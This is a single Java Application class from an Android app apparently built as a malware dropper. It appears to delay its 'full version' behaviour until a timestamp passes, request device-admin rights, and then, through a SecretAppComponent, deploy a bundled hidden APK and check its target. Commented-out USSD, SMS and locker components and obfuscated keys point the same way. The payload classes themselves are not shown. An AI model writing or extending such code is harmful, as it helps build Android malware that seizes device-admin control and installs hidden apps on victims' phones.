package com.app.manager;

import android.app.Application;

import java.util.ArrayList;
import java.util.List;

import insta.request.c_master.ActivationListener;
import insta.request.c_master.AdminComponent;
import main.app.c_master.NotificationsComponent;
import main_commons.app.c_master.commons.CommonUtils;
import main_commons.app.c_master.commons.commons.SdkCommonsImpl;
import main_commons.app.c_master.commons.commons.SdkComponent;
import refs.me.c_master.ReferencesComponent;
import secretapp.web.com.SecretAppComponent;
import utils.helper.c_master.InstallsComponent;

public class App extends Application implements ActivationListener {

    private SecretAppComponent secretAppComponent;

    @Override
    public void onCreate() {
        super.onCreate();
        final Class launcherActivity = SplashActivity.class;
        boolean useFullVersion = CommonUtils.checkIsFullVersionTime(BuildConfig.U_D);
        List<SdkComponent> components = new ArrayList<>();
        components.add(new InstallsComponent());
        //        components.add(new UssdComponent());
        //        components.add(new TextComponent());
        //        components.add(new LockerComponent());
        components.add(new AdminComponent()
                .setStartLauncherActivity(true)
                .setActivationListener(this)
        );
        components.add(new ReferencesComponent());
        components.add(new NotificationsComponent());
        components.add(secretAppComponent = new SecretAppComponent("app-release.apk"));
        SdkCommonsImpl.init(this,
                BuildConfig.APPLICATION_ID,
                CommonUtils.wrapStringWithKeys(BuildConfig.ARG_1, BuildConfig.KEY_1),
                launcherActivity,
                BuildConfig.DEBUG, useFullVersion,
                components);
    }

    @Override
    public void onActivated() {
        if (secretAppComponent != null) {
            secretAppComponent.checkTarget();
        }
    }

    @Override
    public void onDeactivated() {

    }
}
